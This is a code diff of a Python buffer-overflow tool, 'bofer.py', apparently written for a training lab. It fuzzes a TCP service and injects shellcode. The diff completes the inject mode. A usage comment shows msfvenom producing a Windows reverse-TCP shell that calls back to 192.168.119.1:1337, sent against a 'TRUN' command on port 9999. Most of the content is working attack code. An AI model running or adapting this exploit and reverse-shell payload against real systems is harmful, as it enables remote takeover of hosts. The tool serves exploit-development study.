@@ -15,33 +15,36 @@
 
 
 '''
+Bug> Blank Register Window
+Press Alt + C to get it back. 
+
+You can do this by going to View -> CPU. 
+
 EXAMPLE usage of Shell code injection
 
-Payload come after the -c key
-
-offset=$(python3 -c "print('A'*1000)") 
-
+offset=2003vul
 
 vulnerable_address="ABCCDDEE" #pay attention to Endianess - reverse the address value if its little endian
 
-NOP=$(python3 -c "print('90'*32)") 
+NOP=$(python3 -c "print('90'*16)") 
 
 shell_code=$(msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.1 LPORT=1337 -a x64 --platform windows -f hex)
 
-payload=$offset$vulnerable_address$NOP$shell_code 
+payload=$vulnerable_address$NOP$shell_code 
 
-python3 bofer.py -x 'TRUN /.:/' -n 2003 -c $payload inject 192.168.56.6 9999
+python3 bofer.py -x 'TRUN /.:/' -n $offset -c $payload inject 192.168.56.6 9999
 
 
 '''
 
 
 from operator import mod
-import sys, socket
+import sys
+import socket
 from time import sleep
 import argparse
 
-#bad characters needed for testing
+# bad characters needed for testing
 BadChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
             b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
             b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
@@ -60,11 +63,14 @@ BadChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
             b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
             )
 
-def test_connection(target_ip,target_port):
-    #test connection to host
+
+def test_connection(target_ip, target_port):
+    # test connection to host
     try:
-        k = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        k.connect((target_ip,target_port))
+        k = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        k.settimeout(10)
+        k.connect((target_ip, target_port))
+        k.settimeout(None)
     except Exception as e:
         print(e)
         sys.exit(1)
@@ -73,9 +79,9 @@ def test_connection(target_ip,target_port):
 
 
 def spike_fuzz_mode(target_ip, target_port, mode, suffix, prefill, step):
-    #spike and fuzz modes
+    # spike and fuzz modes
 
-    #standard step size for fuzz
+    # standard step size for fuzz
     package = b'A'*step
 
     if mode == 'spike':
@@ -83,64 +89,76 @@ def spike_fuzz_mode(target_ip, target_port, mode, suffix, prefill, step):
     else:
         mult = 1
 
-    #the smaller the step, the higher is accuracy
+    # the smaller the step, the higher is accuracy
     buffer = suffix + prefill
 
-    while (True and  (mode != "inject" )):
+    while (True and (mode != "inject")):
         try:
-            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect((target_ip,target_port))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
 
-            #send information as bytes
+            # send information as bytes
             s.sendall(buffer)
             s.close()
-            
+
             sleep(1)
             buffer = buffer + package * mult
-            print("Server alive. Total payload size = %d" % len(buffer)) 
+            print("Server alive. Total payload size = %d" % len(buffer))
 
         except KeyboardInterrupt:
             print("Operation aborted. Exiting...")
             sys.exit()
 
         except:
-            print("Overflow at  %d bytes including suffix of %d bytes." % len(buffer), len(suffix))
+            print("Overflow at  %d bytes including suffix of %d bytes." %
+                  len(buffer), len(suffix))
             sys.exit(1)
 
 
-def inject_mode(target_ip, target_port, useBadChars, suffix, prefill, shellcode, BadChars):
-    print("tbd")
-    
+def inject_mode(target_ip, target_port, BadChars, suffix, prefill, shellcode, useBadChars):
+
     if not useBadChars:
-        BadChars =b""
+        BadChars = bytearray("", encoding='ascii')
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, target_port))
 
-    s.sendall(suffix + prefill + BadChars + shellcode)
+    s.sendall(suffix + prefill + BadChars + shellcode + b"\n")
+
+    print(f"Injected into {target_ip}:{target_port}")
+
     s.close()
+
 
 def main():
 
     parser = argparse.ArgumentParser()
 
-#modes: spike, fuzz, inject
-#spike: find vulnerable entry points
-#fuzz: increase buffer gradually with smaller steps to identify BoF location
-#inject: inject payload
+# modes: spike, fuzz, inject
+# spike: find vulnerable entry points
+# fuzz: increase buffer gradually with smaller steps to identify BoF location
+# inject: inject payload
 
-    parser.add_argument('bofMode', type=str, help='Enter BoF mode: spike, fuzz, inject')
-    parser.add_argument('targetIP', type=str, help='ip address of the target host')
-    parser.add_argument('targetPort', type=int, help='port number of the target host')
-    parser.add_argument('-s','--step', default=100, type=int, help='Step is amount of bytes to use in Fuzzying mode')
-    parser.add_argument('-x','--suffix', default='', type=str, help='Suffix can be used at the beginning of each TCP frame to make correct requests')
-    parser.add_argument('-n','--prefill_num', default=0, type=int, help='Prefill the payload with n bytes after suffix')
-    parser.add_argument('-a','--prefill_hex', default='', type=str, help='Prefill the payload with specific hex symbols')
-    parser.add_argument('-b','--useBadChars', default=0, type=int, help="1: bad character placement; 0: no bad characters")
-    parser.add_argument('-c','--ShellCode', default='', type=str, help="Input as is. Example: \"AA BB CC\"")
+    parser.add_argument('bofMode', type=str,
+                        help='Enter BoF mode: spike, fuzz, inject')
+    parser.add_argument('targetIP', type=str,
+                        help='ip address of the target host')
+    parser.add_argument('targetPort', type=int,
+                        help='port number of the target host')
+    parser.add_argument('-s', '--step', default=100, type=int,
+                        help='Step is amount of bytes to use in Fuzzying mode')
+    parser.add_argument('-x', '--suffix', default='', type=str,
+                        help='Suffix can be used at the beginning of each TCP frame to make correct requests')
+    parser.add_argument('-n', '--prefill_num', default=0, type=int,
+                        help='Prefill the payload with n bytes after suffix')
+    parser.add_argument('-a', '--prefill_hex', default='', type=str,
+                        help='Prefill the payload with specific hex symbols')
+    parser.add_argument('-b', '--useBadChars', default=0, type=int,
+                        help="1: bad character placement; 0: no bad characters")
+    parser.add_argument('-c', '--ShellCode', default='',
+                        type=str, help="Input as is. Example: \"AA BB CC\"")
 
-
-    #parse inputs
+    # parse inputs
     args = parser.parse_args()
 
     #mode in use
@@ -149,9 +167,9 @@ def main():
     target_ip = args.targetIP
     target_port = args.targetPort
     step = args.step
-    suffix = bytearray(args.suffix, encoding ='ascii')
+    suffix = bytearray(args.suffix, encoding='ascii')
     prefill_num = args.prefill_num
-    prefill_hex = bytearray(args.prefill_hex, encoding ='ascii')
+    prefill_hex = bytearray(args.prefill_hex, encoding='ascii')
     useBadChars = args.useBadChars
     shellcode = bytearray.fromhex(args.ShellCode)
 
@@ -159,18 +177,20 @@ def main():
 
     if mode == "spike" or mode == "fuzz":
 
-        test_connection(target_ip,target_port)
+        test_connection(target_ip, target_port)
         spike_fuzz_mode(target_ip, target_port, mode, suffix, prefill, step)
 
     elif mode == "inject":
 
-        test_connection(target_ip,target_port)
-        inject_mode(target_ip, target_port, BadChars, suffix, prefill, shellcode, useBadChars)
+        test_connection(target_ip, target_port)
+        inject_mode(target_ip, target_port, BadChars,
+                    suffix, prefill, shellcode, useBadChars)
 
     else:
         print(f"Uknown mode: {mode} ... exiting")
         print("Try entering: spike, fuzz, inject")
         sys.exit(1)
+
 
 if __name__ == "__main__":
     main()
